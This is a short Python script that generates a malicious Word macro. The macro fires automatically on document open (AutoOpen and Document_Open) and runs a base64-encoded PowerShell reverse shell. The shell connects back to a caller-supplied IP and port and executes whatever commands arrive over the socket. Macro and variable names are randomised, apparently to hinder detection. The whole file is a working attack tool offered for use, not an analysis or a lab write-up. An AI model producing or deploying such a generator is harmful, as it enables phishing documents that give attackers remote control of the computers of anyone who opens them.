#!/usr/bin/env python3
#
# Generates full malicious macro with PowerShell encoded Reverse Shell payload.
# Dim variable name is randomly selected 10 chars. 
# Reverse Shell generator portion was taken from https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58
#

import sys
import base64
import string
import random

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns Macro with reverse shell PowerShell base64 encoded payload connecting to IP:PORT.")
    exit()

try:
	(ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
	help()

# payload from Nikhil Mittal @samratashok
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

str = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

letters = string.ascii_letters

Dim = ''.join(random.choice(letters) for i in range(10))
macro_name = ''.join(random.choice(letters) for i in range(10))

n = 50

# AutoOpen() Sub procedure
print("Sub AutoOpen()")
print(f"\t{macro_name}")
print("End Sub")

# Document_Open() Sub procedure
print("Sub Document_Open()")
print(f"\t{macro_name}")
print("End Sub")

# Encoded PowerShell Reverse Shell Macro
print(f"Sub {macro_name}")
print(f"\tDim {Dim} As String")
for i in range(0, len(str), n):
    print(f"\t{Dim} = {Dim} + " + '"' + str[i:i+n] + '"')
print(f'\tCreateObject("Wscript.Shell").Run {Dim}')
print("End Sub")
